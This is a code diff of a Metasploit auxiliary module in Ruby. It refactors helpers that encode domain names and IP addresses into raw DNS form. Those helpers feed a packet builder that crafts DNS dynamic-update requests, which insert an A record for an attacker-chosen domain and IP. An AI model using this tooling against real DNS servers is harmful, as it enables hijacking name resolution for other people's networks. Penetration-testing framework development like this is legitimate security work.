@@ -52,25 +52,24 @@ class MetasploitModule < Msf::Auxiliary
 
   end
 
-  #
-  # Update String class for easir domain and IP processing
-  #
-  class ::String
-    # DNS protocol converts domain to string_size+\x03+binary_string. eg. rubyfu.net = \x06rubyfu\x03net
-    def domain_to_raw
-      self.split('.').map do |part|
-        part_size  = '%02x' % part.size
-        domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
-        part_size + domain2hex
-      end.join.scan(/../).map { |x| x.hex.chr }.join
-    end
 
-    def ip_to_hex
-      self.split(".").map(&:to_i).pack("C*")
-    end
+  # DNS protocol converts domain to string_size+\x03+binary_string. eg. rubyfu.net = \x06rubyfu\x03net
+  def domain_to_raw(domain_name)
+    return domain_name.split('.').map do |part|
+      part_size  = '%02x' % part.size
+      domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
+      part_size + domain2hex
+    end.join.scan(/../).map { |x| x.hex.chr }.join
   end
 
+  # Converts IP address to hex format with eliminating the Dots as DNS protocol does.
+  def ip_to_hex(ip_addr)
+    return ip_addr.split(".").map(&:to_i).pack("C*")
+  end
 
+  #
+  # Build the DNS update A record query
+  #
   def build_a_record(action, domain, attacker_domain, attacker_ip)
     case
       when action == 'ADD'
@@ -104,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
     # Zone
     #   <DOMAIN>: type SOA, class IN
     #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
-    domain.domain_to_raw + "\x00" +
+    domain_to_raw(domain) + "\x00" +
     #   Type: SOA (Start Of a zone of Authority) (6)
     "\x00\x06" +
     #   Class: IN (0x0001)
@@ -113,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
     # Updates
     #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
     #   Name: <ATTACKER_DOMAIN>
-    attacker_domain.domain_to_raw + "\x00" +
+    domain_to_raw(attacker_domain) + "\x00" +
     #   Type: _type
     _type +
     #   Class: _class
@@ -123,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     #   Data length: _datalen
     _datalen +
     #   Address: <ATTACKER_IP>
-    attacker_ip.ip_to_hex
+    ip_to_hex(attacker_ip)
   end
 
 
